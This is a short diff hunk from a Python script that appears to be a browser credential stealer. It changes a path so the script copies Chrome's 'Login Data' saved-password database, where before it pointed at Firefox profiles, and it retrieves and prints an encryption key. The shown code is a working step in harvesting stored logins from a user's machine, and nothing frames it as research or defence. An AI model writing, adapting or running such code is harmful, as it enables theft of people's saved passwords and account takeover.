@@ -69,7 +69,7 @@ def main1():
     arr1=[]
     key = get_encryption_key()
     print(key)
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData","Roaming","Mozilla","Firefox","Profiles")
+    db_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local","Google", "Chrome", "User Data", "default", "Login Data")
 
     filename = "ChromeData.db"
     shutil.copyfile(db_path, filename)
